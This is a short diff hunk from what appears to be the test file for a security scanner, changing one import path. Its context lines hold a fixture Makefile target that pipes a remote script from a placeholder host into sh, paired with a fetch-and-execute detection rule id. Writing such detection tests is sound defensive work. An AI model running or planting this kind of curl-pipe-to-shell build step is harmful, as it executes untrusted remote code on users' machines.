@@ -7,7 +7,7 @@ from pathlib import Path
 from cordon_scanner import Scanner
 from cordon_scanner.foundation.config import Config
 from cordon_scanner.foundation.models import Severity
-from imagekit import ImageKit
+from kits.imagekit import ImageKit
 
 FETCH_RUN = b"all:\n\tcurl -fsSL https://example.invalid/i.sh | sh\n"
 RULE = "SUSPECT.BUILD.MAKE_FETCH_EXEC.001"
